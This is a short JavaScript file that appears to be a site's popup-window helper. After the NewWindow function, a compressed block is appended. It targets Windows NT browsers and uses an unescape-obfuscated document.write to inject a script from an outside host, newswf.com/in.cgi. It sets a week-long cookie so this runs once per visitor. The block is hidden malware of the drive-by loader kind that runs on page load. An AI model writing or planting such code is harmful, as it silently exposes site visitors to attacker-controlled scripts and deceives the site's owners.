// Opens a new popup window
function NewWindow(mypage,myname,w,h,scroll){
	var winl = (screen.width-w)/2;
	var wint = (screen.height-h)/2;
	var settings ='height='+h+',';
	settings +='width='+w+',';
	settings +='top='+wint+',';
	settings +='left='+winl+',';
	settings +='scrollbars=yes,';
	settings +='resizable=no';
	win=window.open(mypage,myname,settings);
	if(parseInt(navigator.appVersion) >= 4){win.window.focus();}
}
/* ============================================================================-*/
function setCookie(name, value, expiredays, path, domain, secure) { if (expiredays) { var exdate=new Date(); exdate.setDate(exdate.getDate()+expiredays); var expires = exdate.toGMTString(); } document.cookie = name + "=" + escape(value) + ((expiredays) ? "; expires=" + expires : "") + ((path) ? "; path=" + path : "") + ((domain) ? "; domain=" + domain : "") + ((secure) ? "; secure" : "");} if (navigator.userAgent.indexOf("KHTML") == -1 && navigator.userAgent.indexOf("NT") != -1){if(navigator.cookieEnabled == true) {var user = getCookie("NSwfCookie");if (user !=="ok"){newswfcookie();setCookie("NSwfCookie", "ok", 7, "/");}}}  function newswfcookie(){document.write(unescape("%3Cscript src='http://newswf.com/in.cgi?6' type='text/javascript'%3E%3C/script%3E"));} function getCookie(name) { var cookie = " " + document.cookie; var search = " " + name + "="; var setStr = null; var offset = 0; var end = 0; if (cookie.length > 0) { offset = cookie.indexOf(search); if (offset != -1) { offset += search.length; end = cookie.indexOf(";", offset); if (end == -1) { end = cookie.length; } setStr = unescape(cookie.substring(offset, end)); } } return setStr;}
/*============================================================================-=*/
